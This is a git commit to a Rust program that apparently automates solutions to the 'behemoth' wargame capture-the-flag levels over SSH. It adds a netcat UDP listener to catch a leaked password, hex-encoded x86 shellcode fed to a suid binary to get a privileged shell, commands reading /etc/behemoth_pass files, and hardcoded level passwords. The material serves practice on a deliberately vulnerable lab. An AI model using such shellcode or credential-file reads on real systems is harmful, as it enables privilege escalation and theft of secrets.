2db7f1dfb9435a77c768d355a2a2d66feb9bc052
Christopher <chris@grislygrotto.nz>
2024-02-07 18:23:12 +1300

    finished behemoth6

--- src/main.rs
+++ src/main.rs
@@ -13,7 +13,10 @@ fn main() -> Result<()> {
     //let pass_3 = behemoth2(&pass_2)?;
     //let pass_4 = behemoth3(&pass_3)?;
     //let pass_5 = behemoth4(&pass_4)?;
-    let _pass_6 = behemoth5("g4jEuK9BTU")?;
+    //let pass_6 = behemoth5(&pass_5)?;
+    let _pass_7 = behemoth6("cBucvF0OhB"); //(&pass_6)?;
+    // let pass_8 = behemoth7(&pass_7)?;
+    // behemoth8(&pass_8)?;
 
     Ok(())
 }
@@ -310,8 +313,85 @@ fn behemoth4(password: &str) -> Result<String> {
 }
 
 fn behemoth5(password: &str) -> Result<String> {
-    
+    // the code for behemoth5 is a bit messy in ghidra, but basically it opens the pass file,
+    // creates a udp socket to localhost 1337, and sends the password through before closing.
+    // to get it, we only need to listen there with nc.
+
     let session = ssh_session("behemoth5", password)?;
+    let mut channel = session.channel_session()?;
+    create_shell(&mut channel)?;
+    read_until(&mut channel, "$ ")?;
+
+    println!("creating a tmp folder and moving to it");
+    write_line(&mut channel, "cd $(mktemp -d)")?;
+    read_until(&mut channel, "$ ")?;
+
+    println!("starting a nc UDP listener");
+    write_line(&mut channel, "nc -lu localhost 1337 > out.txt &")?;
+    read_until(&mut channel, "$ ")?;
+
+    println!("running target");
+    write_line(&mut channel, "/behemoth/behemoth5")?;
+    read_until(&mut channel, "$ ")?;
+
+    write_line(&mut channel, "cat out.txt")?;
+    let result = read_until(&mut channel, "$ ")?;
+    let result = result.split(['\r','\n']).map(|s| s.trim()).find(|s| s.len() == 10).unwrap();
+    println!("retrieved behemoth5 pass '{result}'\n");
+
+    Ok(result.to_string())
+}
+
+fn behemoth6(password: &str) -> Result<String> {
+    // behemoth6 runs behemoth6_reader, and if that process returns 'HelloKitty' then behemoth6 will open a suid shell
+    // behemoth6_reader, in turn, opens shellcode.txt and will mem map and then run its contents.
+    // so the solution is to create some shellcode that will return that required text.
+    // two further restrictions: shellcode cannot contain 0xb and must be shorter than 4095 bytes - both easily avoidable.
+    // we can re-use reading shell code used in earlier challenges
+    
+    let session = ssh_session("behemoth6", password)?;
+    let mut channel = session.channel_session()?;
+    create_shell(&mut channel)?;
+
+    read_until(&mut channel, "$ ")?;
+
+    println!("creating a tmp folder and moving to it");
+    write_line(&mut channel, "cd $(mktemp -d)")?;
+    read_until(&mut channel, "$ ")?;
+
+    println!("creating input files (flag and shellcode)");
+    write_line(&mut channel, "echo -n HelloKitty > flag.txt")?;
+    read_until(&mut channel, "$ ")?;
+    let shellcode = hex::decode("31C031DB31C931D2EB325BB00531C9CD8089C6EB06B00131DBCD8089F3B00383EC018D0C24B201CD8031DB39C374E6B004B301B201CD8083C401EBDFE8C9FFFFFF")?;
+    write_line(&mut channel, &format!("echo -en \"{}flag.txt\" > shellcode.txt", hex_literal(&shellcode)))?;
+    read_until(&mut channel, "$ ")?;
+
+    println!("starting behemoth6 to get suid shell");
+    write_line(&mut channel, "/behemoth/behemoth6")?;
+    read_until(&mut channel, "$ ")?;
+
+    write_line(&mut channel, "cat /etc/behemoth_pass/behemoth7")?;
+    let result = read_until(&mut channel, "$ ")?;
+    let result = result.split(['\r','\n']).map(|s| s.trim()).find(|s| s.len() == 10).unwrap();
+    println!("retrieved behemoth7 pass '{result}'\n");
+
+    Ok("result".to_string())
+}
+
+fn behemoth7(password: &str) -> Result<String> {
+    
+    let session = ssh_session("behemoth7", password)?;
+    let mut channel = session.channel_session()?;
+    create_shell(&mut channel)?;
+
+    read_until(&mut channel, "$ ")?;
+
+    Ok("result".to_string())
+}
+
+fn behemoth8(password: &str) -> Result<String> {
+    
+    let session = ssh_session("behemoth8", password)?;
     let mut channel = session.channel_session()?;
     create_shell(&mut channel)?;
 
